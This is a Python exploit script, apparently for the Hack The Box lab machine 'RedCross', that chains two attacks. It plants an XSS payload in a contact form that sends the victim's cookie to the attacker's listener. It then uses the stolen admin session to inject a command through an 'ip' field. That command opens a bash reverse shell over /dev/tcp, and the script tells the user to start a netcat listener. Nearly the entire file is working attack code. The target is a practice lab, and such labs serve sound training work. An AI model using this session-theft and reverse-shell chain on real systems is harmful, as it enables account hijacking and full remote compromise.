# from xss to rce
import requests
import re
import logging
import socket
import random
import sys
import time

logging.captureWarnings(True)
def xss(url,ip): # ur ip
    port = random.randint(10000,65000)
    payload = f'"><script> new Image().src="http://{ip}:{port}/index.php?c="+document.cookie;</script>'
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
        "Cookie": "LIMIT=10; PHPSESSID=dmg319t551nqpmgvek216lo643"
    }
    params = {"subject":"Request", "body": "details", "cback": payload, "action": "contact"}
    res = requests.post(url, data=params, allow_redirects=False, verify=False, headers=headers)

    soc = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    soc.bind((ip,port))
    soc.listen(1)
    text = ""

    while True:
        c,addr = soc.accept()
        data = c.recv(1024)
        
        if data:
            text = data.decode("utf-8")
            break
        
    soc.close()
    session = re.search(r'PHPSESSID=([a-zA-Z0-9]+)',text)
    return session.group(0)

def rce(session,ip,url):
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
        "Cookie": session
    }
    payload = f"/bin/bash -c '/bin/bash -i >& /dev/tcp/{ip}/1456 0>&1'"
    params = {"ip":f"1.1.1.1;{payload}","id":"12","action":"deny"}
    res = requests.post(url, data=params, allow_redirects=False, verify=False, headers=headers)

def main():
    print("pleas execute this in ur terminal before running the program: sudo rlwrap nc -nvlp 1456")
    print("Running...")
    time.sleep(5)

    url = "https://intra.redcross.htb/pages/actions.php" # add to /etc/hosts
    url2 = "https://admin.redcross.htb/pages/actions.php" # add to /etc/hosts
    ip = "10.10.16.3" # change this

    session = xss(url,ip) 
    rce(session,ip,url2)


if __name__ == "__main__":
    main()
